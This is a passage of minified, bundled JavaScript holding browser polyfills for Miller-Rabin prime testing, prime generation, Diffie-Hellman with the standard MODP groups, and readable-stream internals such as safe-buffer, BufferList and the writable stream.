    }
    ,
    j.prototype._randrange = function(x, w) {
        var b = w.sub(x);
        return x.add(this._randbelow(b))
    }
    ,
    j.prototype.test = function(x, w, b) {
        var X = x.bitLength()
          , Y = _.mont(x)
          , F = new _(1).toRed(Y);
        w || (w = Math.max(1, X / 48 | 0));
        for (var V = x.subn(1), K = 0; !V.testn(K); K++)
            ;
        for (var Q = x.shrn(K), ee = V.toRed(Y), ae = !0; w > 0; w--) {
            var ne = this._randrange(new _(2), V);
            b && b(ne);
            var oe = ne.toRed(Y).redPow(Q);
            if (!(oe.cmp(F) === 0 || oe.cmp(ee) === 0)) {
                for (var ue = 1; ue < K; ue++) {
                    if (oe = oe.redSqr(),
                    oe.cmp(F) === 0)
                        return !1;
                    if (oe.cmp(ee) === 0)
                        break
                }
                if (ue === K)
                    return !1
            }
        }
        return ae
    }
    ,
    j.prototype.getDivisor = function(x, w) {
        var b = x.bitLength()
          , X = _.mont(x)
          , Y = new _(1).toRed(X);
        w || (w = Math.max(1, b / 48 | 0));
        for (var F = x.subn(1), V = 0; !F.testn(V); V++)
            ;
        for (var K = x.shrn(V), Q = F.toRed(X); w > 0; w--) {
            var ee = this._randrange(new _(2), F)
              , ae = x.gcd(ee);
            if (ae.cmpn(1) !== 0)
                return ae;
            var ne = ee.toRed(X).redPow(K);
            if (!(ne.cmp(Y) === 0 || ne.cmp(Q) === 0)) {
                for (var oe = 1; oe < V; oe++) {
                    if (ne = ne.redSqr(),
                    ne.cmp(Y) === 0)
                        return ne.fromRed().subn(1).gcd(x);
                    if (ne.cmp(Q) === 0)
                        break
                }
                if (oe === V)
                    return ne = ne.redSqr(),
                    ne.fromRed().subn(1).gcd(x)
            }
        }
        return !1
    }
    ,
    mr
}
var generatePrime, hasRequiredGeneratePrime;
function requireGeneratePrime() {
    if (hasRequiredGeneratePrime)
        return generatePrime;
    hasRequiredGeneratePrime = 1;
    var _ = requireBrowser$c();
    generatePrime = oe,
    oe.simpleSieve = ae,
    oe.fermatTest = ne;
    var M = requireBn$6()
      , j = new M(24)
      , O = requireMr()
      , x = new O
      , w = new M(1)
      , b = new M(2)
      , X = new M(5);
    new M(16),
    new M(8);
    var Y = new M(10)
      , F = new M(3);
    new M(7);
    var V = new M(11)
      , K = new M(4);
    new M(12);
    var Q = null;
    function ee() {
        if (Q !== null)
            return Q;
        var ue = 1048576
          , fe = [];
        fe[0] = 2;
        for (var he = 1, pe = 3; pe < ue; pe += 2) {
            for (var ye = Math.ceil(Math.sqrt(pe)), be = 0; be < he && fe[be] <= ye && pe % fe[be] !== 0; be++)
                ;
            he !== be && fe[be] <= ye || (fe[he++] = pe)
        }
        return Q = fe,
        fe
    }
    function ae(ue) {
        for (var fe = ee(), he = 0; he < fe.length; he++)
            if (ue.modn(fe[he]) === 0)
                return ue.cmpn(fe[he]) === 0;
        return !0
    }
    function ne(ue) {
        var fe = M.mont(ue);
        return b.toRed(fe).redPow(ue.subn(1)).fromRed().cmpn(1) === 0
    }
    function oe(ue, fe) {
        if (ue < 16)
            return fe === 2 || fe === 5 ? new M([140, 123]) : new M([140, 39]);
        fe = new M(fe);
        for (var he, pe; ; ) {
            for (he = new M(_(Math.ceil(ue / 8))); he.bitLength() > ue; )
                he.ishrn(1);
            if (he.isEven() && he.iadd(w),
            he.testn(1) || he.iadd(b),
            fe.cmp(b)) {
                if (!fe.cmp(X))
                    for (; he.mod(Y).cmp(F); )
                        he.iadd(K)
            } else
                for (; he.mod(j).cmp(V); )
                    he.iadd(K);
            if (pe = he.shrn(1),
            ae(pe) && ae(he) && ne(pe) && ne(he) && x.test(pe) && x.test(he))
                return he
        }
    }
    return generatePrime
}
const modp1 = {
    gen: "02",
    prime: "ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a63a3620ffffffffffffffff"
}
  , modp2 = {
    gen: "02",
    prime: "ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece65381ffffffffffffffff"
}
  , modp5 = {
    gen: "02",
    prime: "ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca237327ffffffffffffffff"
}
  , modp14 = {
    gen: "02",
    prime: "ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca18217c32905e462e36ce3be39e772c180e86039b2783a2ec07a28fb5c55df06f4c52c9de2bcbf6955817183995497cea956ae515d2261898fa051015728e5a8aacaa68ffffffffffffffff"
}
  , modp15 = {
    gen: "02",
    prime: "ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca18217c32905e462e36ce3be39e772c180e86039b2783a2ec07a28fb5c55df06f4c52c9de2bcbf6955817183995497cea956ae515d2261898fa051015728e5a8aaac42dad33170d04507a33a85521abdf1cba64ecfb850458dbef0a8aea71575d060c7db3970f85a6e1e4c7abf5ae8cdb0933d71e8c94e04a25619dcee3d2261ad2ee6bf12ffa06d98a0864d87602733ec86a64521f2b18177b200cbbe117577a615d6c770988c0bad946e208e24fa074e5ab3143db5bfce0fd108e4b82d120a93ad2caffffffffffffffff"
}
  , modp16 = {
    gen: "02",
    prime: "ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca18217c32905e462e36ce3be39e772c180e86039b2783a2ec07a28fb5c55df06f4c52c9de2bcbf6955817183995497cea956ae515d2261898fa051015728e5a8aaac42dad33170d04507a33a85521abdf1cba64ecfb850458dbef0a8aea71575d060c7db3970f85a6e1e4c7abf5ae8cdb0933d71e8c94e04a25619dcee3d2261ad2ee6bf12ffa06d98a0864d87602733ec86a64521f2b18177b200cbbe117577a615d6c770988c0bad946e208e24fa074e5ab3143db5bfce0fd108e4b82d120a92108011a723c12a787e6d788719a10bdba5b2699c327186af4e23c1a946834b6150bda2583e9ca2ad44ce8dbbbc2db04de8ef92e8efc141fbecaa6287c59474e6bc05d99b2964fa090c3a2233ba186515be7ed1f612970cee2d7afb81bdd762170481cd0069127d5b05aa993b4ea988d8fddc186ffb7dc90a6c08f4df435c934063199ffffffffffffffff"
}
  , modp17 = {
    gen: "02",
    prime: "ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca18217c32905e462e36ce3be39e772c180e86039b2783a2ec07a28fb5c55df06f4c52c9de2bcbf6955817183995497cea956ae515d2261898fa051015728e5a8aaac42dad33170d04507a33a85521abdf1cba64ecfb850458dbef0a8aea71575d060c7db3970f85a6e1e4c7abf5ae8cdb0933d71e8c94e04a25619dcee3d2261ad2ee6bf12ffa06d98a0864d87602733ec86a64521f2b18177b200cbbe117577a615d6c770988c0bad946e208e24fa074e5ab3143db5bfce0fd108e4b82d120a92108011a723c12a787e6d788719a10bdba5b2699c327186af4e23c1a946834b6150bda2583e9ca2ad44ce8dbbbc2db04de8ef92e8efc141fbecaa6287c59474e6bc05d99b2964fa090c3a2233ba186515be7ed1f612970cee2d7afb81bdd762170481cd0069127d5b05aa993b4ea988d8fddc186ffb7dc90a6c08f4df435c93402849236c3fab4d27c7026c1d4dcb2602646dec9751e763dba37bdf8ff9406ad9e530ee5db382f413001aeb06a53ed9027d831179727b0865a8918da3edbebcf9b14ed44ce6cbaced4bb1bdb7f1447e6cc254b332051512bd7af426fb8f401378cd2bf5983ca01c64b92ecf032ea15d1721d03f482d7ce6e74fef6d55e702f46980c82b5a84031900b1c9e59e7c97fbec7e8f323a97a7e36cc88be0f1d45b7ff585ac54bd407b22b4154aacc8f6d7ebf48e1d814cc5ed20f8037e0a79715eef29be32806a1d58bb7c5da76f550aa3d8a1fbff0eb19ccb1a313d55cda56c9ec2ef29632387fe8d76e3c0468043e8f663f4860ee12bf2d5b0b7474d6e694f91e6dcc4024ffffffffffffffff"
}
  , modp18 = {
    gen: "02",
    prime: "ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca18217c32905e462e36ce3be39e772c180e86039b2783a2ec07a28fb5c55df06f4c52c9de2bcbf6955817183995497cea956ae515d2261898fa051015728e5a8aaac42dad33170d04507a33a85521abdf1cba64ecfb850458dbef0a8aea71575d060c7db3970f85a6e1e4c7abf5ae8cdb0933d71e8c94e04a25619dcee3d2261ad2ee6bf12ffa06d98a0864d87602733ec86a64521f2b18177b200cbbe117577a615d6c770988c0bad946e208e24fa074e5ab3143db5bfce0fd108e4b82d120a92108011a723c12a787e6d788719a10bdba5b2699c327186af4e23c1a946834b6150bda2583e9ca2ad44ce8dbbbc2db04de8ef92e8efc141fbecaa6287c59474e6bc05d99b2964fa090c3a2233ba186515be7ed1f612970cee2d7afb81bdd762170481cd0069127d5b05aa993b4ea988d8fddc186ffb7dc90a6c08f4df435c93402849236c3fab4d27c7026c1d4dcb2602646dec9751e763dba37bdf8ff9406ad9e530ee5db382f413001aeb06a53ed9027d831179727b0865a8918da3edbebcf9b14ed44ce6cbaced4bb1bdb7f1447e6cc254b332051512bd7af426fb8f401378cd2bf5983ca01c64b92ecf032ea15d1721d03f482d7ce6e74fef6d55e702f46980c82b5a84031900b1c9e59e7c97fbec7e8f323a97a7e36cc88be0f1d45b7ff585ac54bd407b22b4154aacc8f6d7ebf48e1d814cc5ed20f8037e0a79715eef29be32806a1d58bb7c5da76f550aa3d8a1fbff0eb19ccb1a313d55cda56c9ec2ef29632387fe8d76e3c0468043e8f663f4860ee12bf2d5b0b7474d6e694f91e6dbe115974a3926f12fee5e438777cb6a932df8cd8bec4d073b931ba3bc832b68d9dd300741fa7bf8afc47ed2576f6936ba424663aab639c5ae4f5683423b4742bf1c978238f16cbe39d652de3fdb8befc848ad922222e04a4037c0713eb57a81a23f0c73473fc646cea306b4bcbc8862f8385ddfa9d4b7fa2c087e879683303ed5bdd3a062b3cf5b3a278a66d2a13f83f44f82ddf310ee074ab6a364597e899a0255dc164f31cc50846851df9ab48195ded7ea1b1d510bd7ee74d73faf36bc31ecfa268359046f4eb879f924009438b481c6cd7889a002ed5ee382bc9190da6fc026e479558e4475677e9aa9e3050e2765694dfc81f56e880b96e7160c980dd98edd3dfffffffffffffffff"
}
  , require$$1$4 = {
    modp1,
    modp2,
    modp5,
    modp14,
    modp15,
    modp16,
    modp17,
    modp18
};
var dh, hasRequiredDh;
function requireDh() {
    if (hasRequiredDh)
        return dh;
    hasRequiredDh = 1;
    var _ = requireBn$6()
      , M = requireMr()
      , j = new M
      , O = new _(24)
      , x = new _(11)
      , w = new _(10)
      , b = new _(3)
      , X = new _(7)
      , Y = requireGeneratePrime()
      , F = requireBrowser$c();
    dh = ae;
    function V(oe, ue) {
        return ue = ue || "utf8",
        Buffer.isBuffer(oe) || (oe = new Buffer(oe,ue)),
        this._pub = new _(oe),
        this
    }
    function K(oe, ue) {
        return ue = ue || "utf8",
        Buffer.isBuffer(oe) || (oe = new Buffer(oe,ue)),
        this._priv = new _(oe),
        this
    }
    var Q = {};
    function ee(oe, ue) {
        var fe = ue.toString("hex")
          , he = [fe, oe.toString(16)].join("_");
        if (he in Q)
            return Q[he];
        var pe = 0;
        if (oe.isEven() || !Y.simpleSieve || !Y.fermatTest(oe) || !j.test(oe))
            return pe += 1,
            fe === "02" || fe === "05" ? pe += 8 : pe += 4,
            Q[he] = pe,
            pe;
        j.test(oe.shrn(1)) || (pe += 2);
        var ye;
        switch (fe) {
        case "02":
            oe.mod(O).cmp(x) && (pe += 8);
            break;
        case "05":
            ye = oe.mod(w),
            ye.cmp(b) && ye.cmp(X) && (pe += 8);
            break;
        default:
            pe += 4
        }
        return Q[he] = pe,
        pe
    }
    function ae(oe, ue, fe) {
        this.setGenerator(ue),
        this.__prime = new _(oe),
        this._prime = _.mont(this.__prime),
        this._primeLen = oe.length,
        this._pub = void 0,
        this._priv = void 0,
        this._primeCode = void 0,
        fe ? (this.setPublicKey = V,
        this.setPrivateKey = K) : this._primeCode = 8
    }
    Object.defineProperty(ae.prototype, "verifyError", {
        enumerable: !0,
        get: function() {
            return typeof this._primeCode != "number" && (this._primeCode = ee(this.__prime, this.__gen)),
            this._primeCode
        }
    }),
    ae.prototype.generateKeys = function() {
        return this._priv || (this._priv = new _(F(this._primeLen))),
        this._pub = this._gen.toRed(this._prime).redPow(this._priv).fromRed(),
        this.getPublicKey()
    }
    ,
    ae.prototype.computeSecret = function(oe) {
        oe = new _(oe),
        oe = oe.toRed(this._prime);
        var ue = oe.redPow(this._priv).fromRed()
          , fe = new Buffer(ue.toArray())
          , he = this.getPrime();
        if (fe.length < he.length) {
            var pe = new Buffer(he.length - fe.length);
            pe.fill(0),
            fe = Buffer.concat([pe, fe])
        }
        return fe
    }
    ,
    ae.prototype.getPublicKey = function(ue) {
        return ne(this._pub, ue)
    }
    ,
    ae.prototype.getPrivateKey = function(ue) {
        return ne(this._priv, ue)
    }
    ,
    ae.prototype.getPrime = function(oe) {
        return ne(this.__prime, oe)
    }
    ,
    ae.prototype.getGenerator = function(oe) {
        return ne(this._gen, oe)
    }
    ,
    ae.prototype.setGenerator = function(oe, ue) {
        return ue = ue || "utf8",
        Buffer.isBuffer(oe) || (oe = new Buffer(oe,ue)),
        this.__gen = oe,
        this._gen = new _(oe),
        this
    }
    ;
    function ne(oe, ue) {
        var fe = new Buffer(oe.toArray());
        return ue ? fe.toString(ue) : fe
    }
    return dh
}
var hasRequiredBrowser$7;
function requireBrowser$7() {
    if (hasRequiredBrowser$7)
        return browser$7;
    hasRequiredBrowser$7 = 1;
    var _ = requireGeneratePrime()
      , M = require$$1$4
      , j = requireDh();
    function O(b) {
        var X = new Buffer(M[b].prime,"hex")
          , Y = new Buffer(M[b].gen,"hex");
        return new j(X,Y)
    }
    var x = {
        binary: !0,
        hex: !0,
        base64: !0
    };
    function w(b, X, Y, F) {
        return Buffer.isBuffer(X) || x[X] === void 0 ? w(b, "binary", X, Y) : (X = X || "binary",
        F = F || "binary",
        Y = Y || new Buffer([2]),
        Buffer.isBuffer(Y) || (Y = new Buffer(Y,F)),
        typeof b == "number" ? new j(_(b, Y),Y,!0) : (Buffer.isBuffer(b) || (b = new Buffer(b,X)),
        new j(b,Y,!0)))
    }
    return browser$7.DiffieHellmanGroup = browser$7.createDiffieHellmanGroup = browser$7.getDiffieHellman = O,
    browser$7.createDiffieHellman = browser$7.DiffieHellman = w,
    browser$7
}
var readableBrowser = {
    exports: {}
}, processNextickArgs = {
    exports: {}
}, hasRequiredProcessNextickArgs;
function requireProcessNextickArgs() {
    if (hasRequiredProcessNextickArgs)
        return processNextickArgs.exports;
    hasRequiredProcessNextickArgs = 1,
    typeof process$1 > "u" || !process$1.version || process$1.version.indexOf("v0.") === 0 || process$1.version.indexOf("v1.") === 0 && process$1.version.indexOf("v1.8.") !== 0 ? processNextickArgs.exports = {
        nextTick: _
    } : processNextickArgs.exports = process$1;
    function _(M, j, O, x) {
        if (typeof M != "function")
            throw new TypeError('"callback" argument must be a function');
        var w = arguments.length, b, X;
        switch (w) {
        case 0:
        case 1:
            return process$1.nextTick(M);
        case 2:
            return process$1.nextTick(function() {
                M.call(null, j)
            });
        case 3:
            return process$1.nextTick(function() {
                M.call(null, j, O)
            });
        case 4:
            return process$1.nextTick(function() {
                M.call(null, j, O, x)
            });
        default:
            for (b = new Array(w - 1),
            X = 0; X < b.length; )
                b[X++] = arguments[X];
            return process$1.nextTick(function() {
                M.apply(null, b)
            })
        }
    }
    return processNextickArgs.exports
}
var isarray, hasRequiredIsarray;
function requireIsarray() {
    if (hasRequiredIsarray)
        return isarray;
    hasRequiredIsarray = 1;
    var _ = {}.toString;
    return isarray = Array.isArray || function(M) {
        return _.call(M) == "[object Array]"
    }
    ,
    isarray
}
var streamBrowser, hasRequiredStreamBrowser;
function requireStreamBrowser() {
    return hasRequiredStreamBrowser || (hasRequiredStreamBrowser = 1,
    streamBrowser = requireEvents$1().EventEmitter),
    streamBrowser
}
var safeBuffer = {
    exports: {}
}, hasRequiredSafeBuffer;
function requireSafeBuffer() {
    return hasRequiredSafeBuffer || (hasRequiredSafeBuffer = 1,
    function(_, M) {
        var j = requireDist$4()
          , O = j.Buffer;
        function x(b, X) {
            for (var Y in b)
                X[Y] = b[Y]
        }
        O.from && O.alloc && O.allocUnsafe && O.allocUnsafeSlow ? _.exports = j : (x(j, M),
        M.Buffer = w);
        function w(b, X, Y) {
            return O(b, X, Y)
        }
        x(O, w),
        w.from = function(b, X, Y) {
            if (typeof b == "number")
                throw new TypeError("Argument must not be a number");
            return O(b, X, Y)
        }
        ,
        w.alloc = function(b, X, Y) {
            if (typeof b != "number")
                throw new TypeError("Argument must be a number");
            var F = O(b);
            return X !== void 0 ? typeof Y == "string" ? F.fill(X, Y) : F.fill(X) : F.fill(0),
            F
        }
        ,
        w.allocUnsafe = function(b) {
            if (typeof b != "number")
                throw new TypeError("Argument must be a number");
            return O(b)
        }
        ,
        w.allocUnsafeSlow = function(b) {
            if (typeof b != "number")
                throw new TypeError("Argument must be a number");
            return j.SlowBuffer(b)
        }
    }(safeBuffer, safeBuffer.exports)),
    safeBuffer.exports
}
var util$2 = {}, hasRequiredUtil$2;
function requireUtil$2() {
    if (hasRequiredUtil$2)
        return util$2;
    hasRequiredUtil$2 = 1;
    function _(ne) {
        return Array.isArray ? Array.isArray(ne) : ae(ne) === "[object Array]"
    }
    util$2.isArray = _;
    function M(ne) {
        return typeof ne == "boolean"
    }
    util$2.isBoolean = M;
    function j(ne) {
        return ne === null
    }
    util$2.isNull = j;
    function O(ne) {
        return ne == null
    }
    util$2.isNullOrUndefined = O;
    function x(ne) {
        return typeof ne == "number"
    }
    util$2.isNumber = x;
    function w(ne) {
        return typeof ne == "string"
    }
    util$2.isString = w;
    function b(ne) {
        return typeof ne == "symbol"
    }
    util$2.isSymbol = b;
    function X(ne) {
        return ne === void 0
    }
    util$2.isUndefined = X;
    function Y(ne) {
        return ae(ne) === "[object RegExp]"
    }
    util$2.isRegExp = Y;
    function F(ne) {
        return typeof ne == "object" && ne !== null
    }
    util$2.isObject = F;
    function V(ne) {
        return ae(ne) === "[object Date]"
    }
    util$2.isDate = V;
    function K(ne) {
        return ae(ne) === "[object Error]" || ne instanceof Error
    }
    util$2.isError = K;
    function Q(ne) {
        return typeof ne == "function"
    }
    util$2.isFunction = Q;
    function ee(ne) {
        return ne === null || typeof ne == "boolean" || typeof ne == "number" || typeof ne == "string" || typeof ne == "symbol" || typeof ne > "u"
    }
    util$2.isPrimitive = ee,
    util$2.isBuffer = requireDist$4().Buffer.isBuffer;
    function ae(ne) {
        return Object.prototype.toString.call(ne)
    }
    return util$2
}
var BufferList = {
    exports: {}
}, hasRequiredBufferList;
function requireBufferList() {
    return hasRequiredBufferList || (hasRequiredBufferList = 1,
    function(_) {
        function M(w, b) {
            if (!(w instanceof b))
                throw new TypeError("Cannot call a class as a function")
        }
        var j = requireSafeBuffer().Buffer
          , O = requireUtil$3();
        function x(w, b, X) {
            w.copy(b, X)
        }
        _.exports = function() {
            function w() {
                M(this, w),
                this.head = null,
                this.tail = null,
                this.length = 0
            }
            return w.prototype.push = function(X) {
                var Y = {
                    data: X,
                    next: null
                };
                this.length > 0 ? this.tail.next = Y : this.head = Y,
                this.tail = Y,
                ++this.length
            }
            ,
            w.prototype.unshift = function(X) {
                var Y = {
                    data: X,
                    next: this.head
                };
                this.length === 0 && (this.tail = Y),
                this.head = Y,
                ++this.length
            }
            ,
            w.prototype.shift = function() {
                if (this.length !== 0) {
                    var X = this.head.data;
                    return this.length === 1 ? this.head = this.tail = null : this.head = this.head.next,
                    --this.length,
                    X
                }
            }
            ,
            w.prototype.clear = function() {
                this.head = this.tail = null,
                this.length = 0
            }
            ,
            w.prototype.join = function(X) {
                if (this.length === 0)
                    return "";
                for (var Y = this.head, F = "" + Y.data; Y = Y.next; )
                    F += X + Y.data;
                return F
            }
            ,
            w.prototype.concat = function(X) {
                if (this.length === 0)
                    return j.alloc(0);
                for (var Y = j.allocUnsafe(X >>> 0), F = this.head, V = 0; F; )
                    x(F.data, Y, V),
                    V += F.data.length,
                    F = F.next;
                return Y
            }
            ,
            w
        }(),
        O && O.inspect && O.inspect.custom && (_.exports.prototype[O.inspect.custom] = function() {
            var w = O.inspect({
                length: this.length
            });
            return this.constructor.name + " " + w
        }
        )
    }(BufferList)),
    BufferList.exports
}
var destroy_1, hasRequiredDestroy;
function requireDestroy() {
    if (hasRequiredDestroy)
        return destroy_1;
    hasRequiredDestroy = 1;
    var _ = requireProcessNextickArgs();
    function M(x, w) {
        var b = this
          , X = this._readableState && this._readableState.destroyed
          , Y = this._writableState && this._writableState.destroyed;
        return X || Y ? (w ? w(x) : x && (this._writableState ? this._writableState.errorEmitted || (this._writableState.errorEmitted = !0,
        _.nextTick(O, this, x)) : _.nextTick(O, this, x)),
        this) : (this._readableState && (this._readableState.destroyed = !0),
        this._writableState && (this._writableState.destroyed = !0),
        this._destroy(x || null, function(F) {
            !w && F ? b._writableState ? b._writableState.errorEmitted || (b._writableState.errorEmitted = !0,
            _.nextTick(O, b, F)) : _.nextTick(O, b, F) : w && w(F)
        }),
        this)
    }
    function j() {
        this._readableState && (this._readableState.destroyed = !1,
        this._readableState.reading = !1,
        this._readableState.ended = !1,
        this._readableState.endEmitted = !1),
        this._writableState && (this._writableState.destroyed = !1,
        this._writableState.ended = !1,
        this._writableState.ending = !1,
        this._writableState.finalCalled = !1,
        this._writableState.prefinished = !1,
        this._writableState.finished = !1,
        this._writableState.errorEmitted = !1)
    }
    function O(x, w) {
        x.emit("error", w)
    }
    return destroy_1 = {
        destroy: M,
        undestroy: j
    },
    destroy_1
}
var _stream_writable, hasRequired_stream_writable;
function require_stream_writable() {
    if (hasRequired_stream_writable)
        return _stream_writable;
    hasRequired_stream_writable = 1;
    var _ = requireProcessNextickArgs();
    _stream_writable = ne;
    function M(se) {
        var de = this;
        this.next = null,
        this.entry = null,
        this.finish = function() {
            te(de, se)
        }
    }
    var j = !process$1.browser && ["v0.10", "v0.9."].indexOf(process$1.version.slice(0, 5)) > -1 ? setImmediate : _.nextTick, O;
    ne.WritableState = ee;
    var x = Object.create(requireUtil$2());
    x.inherits = requireInherits_browser();
    var w = {
        deprecate: requireBrowser$e()
    }
      , b = requireStreamBrowser()
      , X = requireSafeBuffer().Buffer
      , Y = (typeof window < "u" || typeof window < "u" ? window : typeof self < "u" ? self : {}).Uint8Array || function() {}
    ;
    function F(se) {
        return X.from(se)
    }
    function V(se) {
        return X.isBuffer(se) || se instanceof Y
    }
    var K = requireDestroy();
    x.inherits(ne, b);
    function Q() {}
    function ee(se, de) {
        O = O || require_stream_duplex(),
        se = se || {};
        var re = de instanceof O;
        this.objectMode = !!se.objectMode,
        re && (this.objectMode = this.objectMode || !!se.writableObjectMode);
        var $ = se.highWaterMark
          , ie = se.writableHighWaterMark
          , ve = this.objectMode ? 16 : 16 * 1024;
        $ || $ === 0 ? this.highWaterMark = $ : re && (ie || ie === 0) ? this.highWaterMark = ie : this.highWaterMark = ve,
        this.highWaterMark = Math.floor(this.highWaterMark),
        this.finalCalled = !1,
        this.needDrain = !1,
        this.ending = !1,
        this.ended = !1,
        this.finished = !1,
        this.destroyed = !1;
        var ge = se.decodeStrings === !1;
        this.decodeStrings = !ge,
        this.defaultEncoding = se.defaultEncoding || "utf8",
        this.length = 0,
        this.writing = !1,
        this.corked = 0,
        this.sync = !0,
        this.bufferProcessing = !1,
        this.onwrite = function(Re) {
            xe(de, Re)
        }
        ,
        this.writecb = null,
        this.writelen = 0,
        this.bufferedRequest = null,
        this.lastBufferedRequest = null,
        this.pendingcb = 0,
        this.prefinished = !1,
        this.errorEmitted = !1,
        this.bufferedRequestCount = 0,
        this.corkedRequestsFree = new M(this)
    }
    ee.prototype.getBuffer = function() {
        for (var de = this.bufferedRequest, re = []; de; )
            re.push(de),
            de = de.next;
        return re
    }
    ,
    function() {
        try {
            Object.defineProperty(ee.prototype, "buffer", {
                get: w.deprecate(function() {
                    return this.getBuffer()
                }, "_writableState.buffer is deprecated. Use _writableState.getBuffer instead.", "DEP0003")
            })
        } catch {}
    }();
    var ae;
    typeof Symbol == "function" && Symbol.hasInstance && typeof Function.prototype[Symbol.hasInstance] == "function" ? (ae = Function.prototype[Symbol.hasInstance],
    Object.defineProperty(ne, Symbol.hasInstance, {
        value: function(se) {
            return ae.call(this, se) ? !0 : this !== ne ? !1 : se && se._writableState instanceof ee
        }
    })) : ae = function(se) {
        return se instanceof this
    }
    ;
    function ne(se) {
        if (O = O || require_stream_duplex(),
        !ae.call(ne, this) && !(this instanceof O))
            return new ne(se);
        this._writableState = new ee(se,this),
        this.writable = !0,
        se && (typeof se.write == "function" && (this._write = se.write),
        typeof se.writev == "function" && (this._writev = se.writev),
        typeof se.destroy == "function" && (this._destroy = se.destroy),
        typeof se.final == "function" && (this._final = se.final)),
        b.call(this)
    }
    ne.prototype.pipe = function() {
        this.emit("error", new Error("Cannot pipe, not readable"))
    }
    ;
    function oe(se, de) {
        var re = new Error("write after end");
        se.emit("error", re),
        _.nextTick(de, re)
    }
    function ue(se, de, re, $) {
        var ie = !0
          , ve = !1;
        return re === null ? ve = new TypeError("May not write null values to stream") : typeof re != "string" && re !== void 0 && !de.objectMode && (ve = new TypeError("Invalid non-string/buffer chunk")),
        ve && (se.emit("error", ve),
        _.nextTick($, ve),
        ie = !1),
        ie
    }
    ne.prototype.write = function(se, de, re) {
        var $ = this._writableState
          , ie = !1
          , ve = !$.objectMode && V(se);
        return ve && !X.isBuffer(se) && (se = F(se)),
        typeof de == "function" && (re = de,
        de = null),
        ve ? de = "buffer" : de || (de = $.defaultEncoding),
        typeof re != "function" && (re = Q),
        $.ended ? oe(this, re) : (ve || ue(this, $, se, re)) && ($.pendingcb++,
        ie = he(this, $, ve, se, de, re)),
        ie
    }
    ,
    ne.prototype.cork = function() {
        var se = this._writableState;
        se.corked++
    }
    ,
    ne.prototype.uncork = function() {
        var se = this._writableState;
        se.corked && (se.corked--,
        !se.writing && !se.corked && !se.bufferProcessing && se.bufferedRequest && Be(this, se))
    }
    ,
    ne.prototype.setDefaultEncoding = function(de) {
        if (typeof de == "string" && (de = de.toLowerCase()),
        !(["hex", "utf8", "utf-8", "ascii", "binary", "base64", "ucs2", "ucs-2", "utf16le", "utf-16le", "raw"].indexOf((de + "").toLowerCase()) > -1))
            throw new TypeError("Unknown encoding: " + de);
        return this._writableState.defaultEncoding = de,
        this
    }
    ;
    function fe(se, de, re) {
        return !se.objectMode && se.decodeStrings !== !1 && typeof de == "string" && (de = X.from(de, re)),
        de
    }
    Object.defineProperty(ne.prototype, "writableHighWaterMark", {
        enumerable: !1,
        get: function() {
            return this._writableState.highWaterMark
        }
    });
    function he(se, de, re, $, ie, ve) {
        if (!re) {
            var ge = fe(de, $, ie);
            $ !== ge && (re = !0,
            ie = "buffer",
            $ = ge)
        }
        var Re = de.objectMode ? 1 : $.length;
        de.length += Re;
        var Pe = de.length < de.highWaterMark;
        if (Pe || (de.needDrain = !0),
        de.writing || de.corked) {
            var Ie = de.lastBufferedRequest;
            de.lastBufferedRequest = {
                chunk: $,
                encoding: ie,
                isBuf: re,
                callback: ve,
                next: null
            },
            Ie ? Ie.next = de.lastBufferedRequest : de.bufferedRequest = de.lastBufferedRequest,
            de.bufferedRequestCount += 1
        } else
